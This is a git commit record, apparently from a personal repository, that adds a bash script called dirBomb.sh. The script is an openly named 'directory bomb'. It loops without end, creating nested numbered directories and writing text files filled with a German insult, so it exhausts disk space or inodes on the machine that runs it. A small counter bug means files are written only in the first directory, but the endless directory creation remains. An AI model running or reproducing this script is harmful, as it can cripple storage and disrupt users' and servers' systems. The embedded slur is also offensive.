93151a8c9ba57a764252005f61789810e6742029
nicolashoeller <hoellr3.0@gmail.com>
2023-11-17 22:18:35 +0100

    first commit

---
+++ bash-personal/dirBomb.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+x=1
+y=0
+
+while [ 1 = 1 ]; do
+    mkdir $x
+    cd $x
+    while [ $y -le 100 ]; do
+        echo "HURENSOHN69" > "$y.txt"
+        ((y++))
+    done
+    cd ..
+    ((x++))
+done
